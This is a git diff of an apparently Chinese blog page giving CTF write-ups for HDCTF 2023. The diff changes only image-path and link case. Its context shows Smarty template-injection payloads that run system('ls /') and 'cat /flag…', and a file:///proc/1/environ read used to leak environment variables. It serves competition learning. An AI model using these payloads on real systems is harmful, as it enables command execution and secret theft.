@@ -441,20 +441,20 @@ SearchMaster首先扫描目录
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h2><p>随便点点就弹出flag了</p>
-<p><img src="/2023/04/22/2023-hdctf/image-20230422130844824.png" alt="image-20230422130844824"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422130844824.png" alt="image-20230422130844824"></p>
 <pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;We13ome_t@_HDCTF_2o23&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h2><p>首先扫描目录</p>
-<p><img src="/2023/04/22/2023-hdctf/image-20230422131014866.png" alt="image-20230422131014866"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422131014866.png" alt="image-20230422131014866"></p>
 <p>访问</p>
-<p><img src="/2023/04/22/2023-hdctf/image-20230422131048842.png" alt="image-20230422131048842"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422131048842.png" alt="image-20230422131048842"></p>
 <p>应该是smarty  ssti在根据题目提示用post传data</p>
 <pre class="line-numbers language-none"><code class="language-none">data&#x3D;&#123;if system(&#39;ls &#x2F;&#39;)&#125;&#123;&#x2F;if&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/04/22/2023-hdctf/image-20230422131231234.png" alt="image-20230422131231234"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422131231234.png" alt="image-20230422131231234"></p>
 <pre class="line-numbers language-none"><code class="language-none">data&#x3D;&#123;if system(&#39;cat &#x2F;flag_13_searchmaster&#39;)&#125;&#123;&#x2F;if&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/04/22/2023-hdctf/image-20230422131304639.png" alt="image-20230422131304639"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422131304639.png" alt="image-20230422131304639"></p>
 <pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;204f2649-fb8f-4bd5-bd14-3940f2d5b780&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h2><p>根据题目提示</p>
@@ -475,10 +475,10 @@ can you give me some?<span aria-hidden="true" class="line-numbers-rows"><span></
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;read?url&#x3D;https:&#x2F;&#x2F;baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>刚开始就直接把他忽略，但是再次看发现read,就想着能不能读取文件，试了伪协议不行，又卡了然后就看到一篇文章可以读取环境变量，就尝试了一下结果真出了</p>
-<p><img src="/2023/04/22/2023-hdctf/image-20230422133632643.png" alt="image-20230422133632643"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422133632643.png" alt="image-20230422133632643"></p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;read?url&#x3D;file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/04/22/2023-hdctf/image-20230422133535890.png" alt="image-20230422133535890"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422133535890.png" alt="image-20230422133535890"></p>
 <pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;449ff62b-d28a-4fd0-9e20-fe20e292df51&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
@@ -492,7 +492,7 @@ can you give me some?<span aria-hidden="true" class="line-numbers-rows"><span></
 
 
 <h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Normal-Rsa"><a href="#Normal-Rsa" class="headerlink" title="Normal_Rsa"></a>Normal_Rsa</h2><p>flag直接在题目代码里  一血</p>
-<p><img src="/2023/04/22/2023-hdctf/image-20230422131417557.png" alt="image-20230422131417557"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422131417557.png" alt="image-20230422131417557"></p>
 <pre class="line-numbers language-none"><code class="language-none">HDCTF&#123;0b3663ed-67e4-44e2-aee7-7c2d8665b63c&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="Normal-Rsa-revenge"><a href="#Normal-Rsa-revenge" class="headerlink" title="Normal_Rsa(revenge)"></a>Normal_Rsa(revenge)</h2><p>因为p是256位，q,r是512位</p>
@@ -569,7 +569,7 @@ m<span class="token operator">=</span><span class="token builtin">pow</span><spa
 <h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h2><p>首先进行脱壳处理</p>
 <p>然后扔进IDA</p>
 <p>发现base64</p>
-<p><img src="/2023/04/22/2023-hdctf/image-20230422101827552.png" alt="image-20230422101827552"></p>
+<p><img src="/2023/04/22/2023-HDCTF/image-20230422101827552.png" alt="image-20230422101827552"></p>
 <p>解码即可</p>
 <pre class="line-numbers language-none"><code class="language-none">HDCTF&#123;Y0u_h@v2_&#x2F;\&#x2F;\@57er3d_7he_r3v3rs3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -714,7 +714,7 @@ extradata:0         .. text: &quot;SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ&#x3D;&
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/04/22/2023-hdctf/">http://example.com/2023/04/22/2023-hdctf/</a>
+                    <a href="http://example.com/2023/04/22/2023-HDCTF/">http://example.com/2023/04/22/2023-HDCTF/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -836,7 +836,7 @@ extradata:0         .. text: &quot;SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ&#x3D;&
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/05/05/edusrc-de-di-yi-ci-wa-jue/">
+                <a href="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/">
                     <div class="card-image">
                         
                         
@@ -885,7 +885,7 @@ extradata:0         .. text: &quot;SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ&#x3D;&
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/04/16/2023-gdouctf/">
+                <a href="/2023/04/16/2023-GDOUCTF/">
                     <div class="card-image">
                         
                         
